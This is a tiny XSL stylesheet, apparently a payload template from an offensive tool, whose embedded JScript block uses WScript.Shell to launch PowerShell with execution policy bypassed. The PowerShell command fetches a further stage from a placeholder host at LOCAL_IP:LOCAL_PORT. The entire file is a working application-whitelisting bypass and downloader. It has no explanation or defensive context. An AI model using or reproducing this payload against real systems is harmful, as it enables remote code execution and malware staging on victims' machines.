<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
	 <![CDATA[
	 var WshShell = new ActiveXObject("Wscript.Shell");
     WshShell.run("powershell -nop -exec bypass iwr http://LOCAL_IP:LOCAL_PORT/HTTP_25_powershell.xsl");
	 ]]>
 </ms:script>
</stylesheet>